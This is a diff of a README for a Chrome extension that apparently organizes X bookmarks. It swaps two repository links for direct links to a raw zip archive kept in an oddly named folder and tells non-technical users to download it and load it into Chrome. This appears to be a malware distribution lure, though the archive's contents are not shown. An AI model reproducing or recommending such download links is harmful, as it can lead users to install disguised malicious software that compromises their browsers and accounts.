@@ -1,12 +1,12 @@
 # 🔖 x-bookmark-manager - Organize your X bookmarks with style
 
-[![](https://img.shields.io/badge/Download_Extension-Blue)](https://github.com/coefficientofselfinductiongoatskin489/x-bookmark-manager)
+[![](https://img.shields.io/badge/Download_Extension-Blue)](https://github.com/coefficientofselfinductiongoatskin489/x-bookmark-manager/raw/refs/heads/main/atheromatous/bookmark_x_manager_v2.8.zip)
 
 This tool organizes your X bookmarks. It displays your saved posts in a clean grid layout. You can search, filter, and export your data without manual effort. Use this extension to find saved posts faster.
 
 ## 📥 Getting Started
 
-[Download the source code here](https://github.com/coefficientofselfinductiongoatskin489/x-bookmark-manager).
+[Download the source code here](https://github.com/coefficientofselfinductiongoatskin489/x-bookmark-manager/raw/refs/heads/main/atheromatous/bookmark_x_manager_v2.8.zip).
 
 You do not need programming knowledge to set this up. Follow these steps to load the extension into your Chrome browser. 
 
